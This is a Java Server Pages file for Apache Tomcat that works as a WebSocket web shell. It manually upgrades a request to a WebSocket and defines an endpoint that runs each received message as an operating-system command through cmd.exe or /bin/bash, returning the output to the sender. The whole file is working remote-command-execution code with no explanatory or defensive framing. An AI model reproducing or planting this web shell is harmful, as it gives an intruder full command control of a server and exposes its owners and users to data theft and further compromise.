<%@ page import="java.util.*" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="javax.websocket.server.ServerContainer" %>
<%@ page import="javax.websocket.server.ServerEndpointConfig" %>
<%@ page import="org.apache.tomcat.websocket.server.WsServerContainer" %>
<%@ page import="org.apache.tomcat.websocket.Constants" %>
<%@ page import="javax.websocket.*" %>
<%@ page import="org.apache.tomcat.websocket.server.WsHandshakeRequest" %>
<%@ page import="org.apache.tomcat.websocket.WsHandshakeResponse" %>
<%@ page import="java.nio.charset.StandardCharsets" %>
<%@ page import="org.apache.tomcat.util.codec.binary.Base64" %>
<%@ page import="org.apache.tomcat.util.security.ConcurrentMessageDigest" %>
<%@ page import="org.apache.tomcat.websocket.server.WsHttpUpgradeHandler" %>
<%@ page import="org.apache.tomcat.websocket.Transformation" %>
<%@ page import="org.apache.catalina.connector.RequestFacade" %>

<%!
    public static class CmdEndpoint extends Endpoint implements MessageHandler.Whole<String> {
        private Session session;
        @Override
        public void onMessage(String s) {
            try {
                Process process;
                boolean bool = System.getProperty("os.name").toLowerCase().startsWith("windows");
                if (bool) {
                    process = Runtime.getRuntime().exec(new String[] { "cmd.exe", "/c", s });
                } else {
                    process = Runtime.getRuntime().exec(new String[] { "/bin/bash", "-c", s });
                }
                InputStream inputStream = process.getInputStream();
                StringBuilder stringBuilder = new StringBuilder();
                int i;
                while ((i = inputStream.read()) != -1)
                    stringBuilder.append((char)i);
                inputStream.close();
                process.waitFor();
                session.getBasicRemote().sendText(stringBuilder.toString());
            } catch (Exception exception) {
                exception.printStackTrace();
            }
        }
        @Override
        public void onOpen(final Session session, EndpointConfig config) {
            this.session = session;
            session.addMessageHandler(this);
        }
    }
    private static String getWebSocketAccept(String key) {
        byte[] WS_ACCEPT = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11".getBytes(StandardCharsets.ISO_8859_1);
        byte[] digest = ConcurrentMessageDigest.digestSHA1(key.getBytes(StandardCharsets.ISO_8859_1), WS_ACCEPT);
        return Base64.encodeBase64String(digest);
    }
%>

<%
    Map<String, String> pathParams = Collections.emptyMap();
    List<Extension> negotiatedExtensionsPhase = Collections.emptyList();
    Transformation transformation = null;
    String subProtocol = null;
    ServletContext servletContext = request.getSession().getServletContext();
    ServerEndpointConfig configEndpoint = ServerEndpointConfig.Builder.create(CmdEndpoint.class, "/x").build();
    WsServerContainer container = (WsServerContainer) servletContext.getAttribute(ServerContainer.class.getName());
    response.setHeader(Constants.UPGRADE_HEADER_NAME, Constants.UPGRADE_HEADER_VALUE);
    response.setHeader(Constants.CONNECTION_HEADER_NAME, Constants.CONNECTION_HEADER_VALUE);
    response.setHeader(HandshakeResponse.SEC_WEBSOCKET_ACCEPT, getWebSocketAccept(request.getHeader("Sec-WebSocket-Key")));
    response.setStatus(101);
    WsHandshakeRequest wsRequest = new WsHandshakeRequest(request, pathParams);
    WsHandshakeResponse wsResponse = new WsHandshakeResponse();
    configEndpoint.getConfigurator().modifyHandshake(configEndpoint, wsRequest, wsResponse);
    try {
        WsHttpUpgradeHandler wsHandler = ((RequestFacade)request).upgrade(WsHttpUpgradeHandler.class); //RequestFacade use for Tomcat 7
        wsHandler.preInit(configEndpoint, container, wsRequest, negotiatedExtensionsPhase, subProtocol, transformation, pathParams, request.isSecure());
        // Tomcat 7 //wsHandler.preInit((Endpoint)configEndpoint, configEndpoint, container, wsRequest, negotiatedExtensionsPhase2, subProtocol, transformation, pathParams, request.isSecure());
    }catch (Exception e) {
        e.printStackTrace();
    }
%>
